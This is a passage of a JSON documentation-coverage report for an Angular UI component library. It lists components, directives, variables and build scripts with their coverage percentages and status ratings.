        "filePath": "libs/datatable/src/lib/sto-datatable/observer.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "observeWidth",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDatatableActionsComponent",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDataTableActionsLeftComponent",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDataTableActionsRightComponent",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body-row/sto-datatable-body-row.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDatatableBodyRowComponent",
        "coveragePercent": 0,
        "coverageCount": "0/16",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDatatableBodyComponent",
        "coveragePercent": 0,
        "coverageCount": "0/42",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-header-group/sto-datatable-header-group.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDatatableHeaderGroupComponent",
        "coveragePercent": 0,
        "coverageCount": "0/8",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-header.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDatatableHeaderComponent",
        "coveragePercent": 0,
        "coverageCount": "0/28",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-resize.directive.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "StoDatatableResizeDirective",
        "coveragePercent": 0,
        "coverageCount": "0/19",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDatatableComponent",
        "coveragePercent": 0,
        "coverageCount": "0/68",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/swimlane-table.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "NormalUse",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/lib/swimlane-table.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "context",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "require",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/testing/utils.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "columns",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/datatable/src/testing/utils.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "rows",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/animation.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "drawerAnimations",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/animation.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "drawerOpenAnimation",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/animation.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "overlayAnimation",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer-item/nav-drawer-item.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "NavDrawerItemComponent",
        "coveragePercent": 0,
        "coverageCount": "0/6",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer-list-item/nav-drawer-list-item.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "NavDrawerListItemComponent",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer-list/nav-drawer-list.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "NavDrawerListComponent",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "NavDrawerComponent",
        "coveragePercent": 0,
        "coverageCount": "0/9",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "type": "component",
        "linktype": "component",
        "name": "WrapperComponent",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "type": "injectable",
        "linktype": "injectable",
        "name": "IconService",
        "coveragePercent": 0,
        "coverageCount": "0/2",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "navigationItems",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "NormalUse",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "WithAppHeader",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "NormalUse",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer-footer.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDrawerFooterComponent",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer-header.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDrawerHeaderComponent",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer-wrapper.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDrawerWrapperComponent",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoDrawerComponent",
        "coveragePercent": 40,
        "coverageCount": "15/37",
        "status": "medium"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "MenuGroup",
        "coveragePercent": 0,
        "coverageCount": "0/6",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "MenuItem",
        "coveragePercent": 0,
        "coverageCount": "0/7",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "MenuItemCommand",
        "coveragePercent": 33,
        "coverageCount": "1/3",
        "status": "medium"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "NavigateCommand",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu-item/navigation-menu-item.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "NavigationMenuItemComponent",
        "coveragePercent": 0,
        "coverageCount": "0/7",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "NavigationMenuComponent",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "NavigationPartComponent",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "NormalUse",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/navigation.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "navigation",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/navigation.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "subNavigation",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/lib/sto-navigation/tokens.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "USE_HASH_ROUTING",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "context",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/drawer/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "require",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "NormalUse",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler/dialog/dialog.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "DialogComponent",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler/error-dialog.service.ts",
        "type": "injectable",
        "linktype": "injectable",
        "name": "ErrorDialogService",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler/error-handler.service.ts",
        "type": "injectable",
        "linktype": "injectable",
        "name": "ErrorHandlerService",
        "coveragePercent": 14,
        "coverageCount": "2/14",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler/error-handler.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "ErrorHandler",
        "coveragePercent": 33,
        "coverageCount": "1/3",
        "status": "medium"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler/error-handler.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "ErrorLogger",
        "coveragePercent": 50,
        "coverageCount": "1/2",
        "status": "medium"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler/error-handler.ts",
        "type": "interface",
        "linktype": "interface",
        "name": "StoErrorHandler",
        "coveragePercent": 50,
        "coverageCount": "1/2",
        "status": "medium"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler/http-error.ts",
        "type": "class",
        "linktype": "classe",
        "name": "Action",
        "coveragePercent": 80,
        "coverageCount": "4/5",
        "status": "very-good"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler/http-error.ts",
        "type": "class",
        "linktype": "classe",
        "name": "HttpError",
        "coveragePercent": 14,
        "coverageCount": "1/7",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler/token.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "CUSTOM_ERROR_HANDLER",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/error-handler/token.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "ERROR_LOGGER",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/wrapper.ts",
        "type": "component",
        "linktype": "component",
        "name": "NextWrapperComponent",
        "coveragePercent": 0,
        "coverageCount": "0/5",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/wrapper.ts",
        "type": "injectable",
        "linktype": "injectable",
        "name": "ErrorHandlerImpl",
        "coveragePercent": 0,
        "coverageCount": "0/2",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/wrapper.ts",
        "type": "injectable",
        "linktype": "injectable",
        "name": "Logger",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/lib/wrapper.ts",
        "type": "function",
        "linktype": "miscellaneous",
        "linksubtype": "function",
        "name": "LoggerFactory",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "context",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/error-handler/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "require",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/number-input/number-input.directive.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "NumberInputDirective",
        "coveragePercent": 53,
        "coverageCount": "14/26",
        "status": "good"
      },
      {
        "filePath": "libs/form/src/lib/number-input/number-input.pipe.ts",
        "type": "pipe",
        "linktype": "pipe",
        "name": "NumberInputPipe",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/number-input/number-input.pipe.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "PADDING",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/number-input/number-input.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/number-input/number-input.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Usage",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/number-input/number-input/number-input.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "NumberInputComponent",
        "coveragePercent": 0,
        "coverageCount": "0/51",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "NumberUnitInputComponent",
        "coveragePercent": 0,
        "coverageCount": "0/54",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
        "type": "class",
        "linktype": "classe",
        "name": "NumberUnit",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "control",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Usage",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/slide-toggle/slide-toggle.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "SlideToggleComponent",
        "coveragePercent": 0,
        "coverageCount": "0/40",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/slide-toggle/slide-toggle.component.ts",
        "type": "class",
        "linktype": "classe",
        "name": "StoSlideToggleChange",
        "coveragePercent": 0,
        "coverageCount": "0/3",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Usage",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-form/form-field.base.ts",
        "type": "class",
        "linktype": "classe",
        "name": "FormFieldBase",
        "coveragePercent": 18,
        "coverageCount": "2/11",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-form/form-field.directive.ts",
        "type": "directive",
        "linktype": "directive",
        "name": "FormFieldDirective",
        "coveragePercent": 0,
        "coverageCount": "0/13",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-form/form-field.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-form/form-field.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Usage",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-option-select-all/sto-option-select-all.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoOptionSelectAllComponent",
        "coveragePercent": 0,
        "coverageCount": "0/11",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-option-select-all/sto-option-select-all.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "items",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-option-select-all/sto-option-select-all.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "SelectAllMulti",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-select-filter/item-list.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "items",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "MultiSelect",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "SingleSelect",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-select-filter/sto-select-filter.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "StoSelectFilterComponent",
        "coveragePercent": 31,
        "coverageCount": "9/29",
        "status": "medium"
      },
      {
        "filePath": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
        "type": "class",
        "linktype": "classe",
        "name": "Modifiers",
        "coveragePercent": 0,
        "coverageCount": "0/5",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "validCommands",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg-actions/wysiwyg-actions.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "WysiwygActionsComponent",
        "coveragePercent": 0,
        "coverageCount": "0/4",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg-editor/wysiwyg-editor.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "WysiwygEditorComponent",
        "coveragePercent": 0,
        "coverageCount": "0/16",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.component.ts",
        "type": "component",
        "linktype": "component",
        "name": "WysiwygComponent",
        "coveragePercent": 0,
        "coverageCount": "0/19",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Template",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "unsanitized",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "Usage",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "context",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "libs/form/src/test.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "require",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "tools/scripts/build-scss.ts",
        "type": "function",
        "linktype": "miscellaneous",
        "linksubtype": "function",
        "name": "processScss",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "tools/scripts/build-scss.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "out",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "tools/scripts/build-scss.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "promises",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "tools/scripts/build-scss.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "root",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "tools/scripts/build-scss.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "writeFile",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "tools/scripts/copy-assets.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "glob",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "tools/scripts/copy-assets.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "out",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "tools/scripts/copy-assets.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "root",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "tools/scripts/copy-assets.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "scss",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      },
      {
        "filePath": "tools/scripts/copy-assets.ts",
        "type": "variable",
        "linktype": "miscellaneous",
        "linksubtype": "variable",
        "name": "src",
        "coveragePercent": 0,
        "coverageCount": "0/1",
        "status": "low"
      }
    ]
  }
}
